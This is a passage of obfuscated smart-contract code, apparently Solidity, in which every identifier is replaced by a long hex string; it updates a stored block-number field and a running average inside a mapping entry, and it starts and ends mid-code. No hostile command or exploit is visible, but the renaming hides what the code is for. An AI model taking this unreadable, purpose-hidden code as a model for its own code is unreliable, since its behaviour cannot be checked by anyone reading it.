{Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95].Ox7ee2a18e0838bdbf657fb075ea5bf752b8f2add16921ff1fa1711c8ace024cc83c707b76f3b984a2c80ee400379a6c82868786cf12994743d61f4a68aa72bf95 = block.number + Oxfe014cf0bb6538c63e80acf759b89d0827d801a7f25530632f3591edf863e03b9f089c37fd36952151ba4b797c9263bd06cb379f5e2f89065882b7d7190cccff;Ox7f44df47842cbd2a80d175e3eb20e45cbc67c122ffcd9727e3041bcca56b53ba60987f9e9be9e3640198fdbe4223d6e2f7fc658e6cce8c856f75aa61b44e5aad = Ox49c7ef34bcf7908bf2d1b64e6cbd62f8625d49e3fb5c131bc8c56c03576ded6ab47fb622a9fc5b56b9a2dde1b7c673b3f1d9f6a1dd82fa8d19059a74056f6c1c(Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95);if(Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95].Ox1fa33859f33fa9e155cc41ef401fb63c9bc335e254b5eeed4ada1d03128f9867d21973a42cbaae2acbbb51541b4f46b5160f2567bf1b02135cce76d58e5231da > 0) { if(Ox7f44df47842cbd2a80d175e3eb20e45cbc67c122ffcd9727e3041bcca56b53ba60987f9e9be9e3640198fdbe4223d6e2f7fc658e6cce8c856f75aa61b44e5aad < Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95].Ox1fa33859f33fa9e155cc41ef401fb63c9bc335e254b5eeed4ada1d03128f9867d21973a42cbaae2acbbb51541b4f46b5160f2567bf1b02135cce76d58e5231da) Ox7f44df47842cbd2a80d175e3eb20e45cbc67c122ffcd9727e3041bcca56b53ba60987f9e9be9e3640198fdbe4223d6e2f7fc658e6cce8c856f75aa61b44e5aad = Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95].Ox1fa33859f33fa9e155cc41ef401fb63c9bc335e254b5eeed4ada1d03128f9867d21973a42cbaae2acbbb51541b4f46b5160f2567bf1b02135cce76d58e5231da;}if(Ox7f44df47842cbd2a80d175e3eb20e45cbc67c122ffcd9727e3041bcca56b53ba60987f9e9be9e3640198fdbe4223d6e2f7fc658e6cce8c856f75aa61b44e5aad > 0 && Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95].Oxee61c1030372de3721b2d2a5a4e3abf50aeb2702ed7f77e03fec57556b9254caa3560bda4b0b337d500db2924524b661577770f0564ca01a02cee9e9f2da1b24 > 1) {Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95].Oxb3124d8d7849f2d02c1b189f919aca91a55b7c48bfcac78ff415437af947140c204ae87b098bb0345ad6710c1c73ee690ddfdb005745b3ab52b090f6ec8f0d02 = ((Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95].Oxb3124d8d7849f2d02c1b189f919aca91a55b7c48bfcac78ff415437af947140c204ae87b098bb0345ad6710c1c73ee690ddfdb005745b3ab52b090f6ec8f0d02*(Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95].Oxee61c1030372de3721b2d2a5a4e3abf50aeb2702ed7f77e03fec57556b9254caa3560bda4b0b337d500db2924524b661577770f0564ca01a02cee9e9f2da1b24-1))+Ox7f44df47842cbd2a80d175e3eb20e45cbc67c122ffcd9727e3041bcca56b53ba60987f9e9be9e3640198fdbe4223d6e2f7fc658e6cce8c856f75aa61b44e5aad)/Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95].Oxee61c1030372de3721b2d2a5a4e3abf50aeb2702ed7f77e03fec57556b9254caa3560bda4b0b337d500db2924524b661577770f0564ca01a02cee9e9f2da1b24;}}}}
